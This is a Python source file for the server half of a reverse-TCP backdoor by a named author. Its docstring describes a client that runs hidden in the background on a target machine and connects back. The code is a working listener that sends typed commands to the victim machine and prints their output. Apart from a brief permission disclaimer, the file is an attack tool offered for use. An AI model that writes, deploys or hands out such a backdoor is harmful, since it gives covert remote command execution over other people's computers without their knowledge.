"""

    This programme is a backdoor which consits of a server scrip and the client script. Once the 
    server script is running, the server will be listening for incoming connections. If the client script
    is run on the target machine, the backdoor will run in the background and will get back a reverse 
    TCP connection between our machine and the target machine. We can then pass commands from the server script
    that will be executed on the target machine and the results will be sent back to us.

    NOTE: Make sure to change the Placeholders with "YOU'RE IP ADDRESS" to you're IP Adress in client.py and server.py file
    
    DISCLAIMER: Programmes like these are to be used on machines you have explicit permission to test.
                I WILL NOT BE RESPONSIBLE FOR MISUSE OF THIS SOFTWARE!

    Written in Python 3.9.1
    
    -Joseph Marc Antony

"""

import socket

HOST = "YOU'RE IP ADDRESS" # Change This
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
print("[*] Listening for Conections...\n")
s.listen()
conn, addr = s.accept()

print(f"[+] Connected to {addr}")

while True:
    command = input(">>> ")
    if command != "":
        if command != "quit":
            conn.send(command.encode())
            recieved_data = conn.recv(5000).decode()
            print(recieved_data)
        else:
            conn.close()
            print("\n[-] Connection Closed!\n")
            break
    else:
        pass
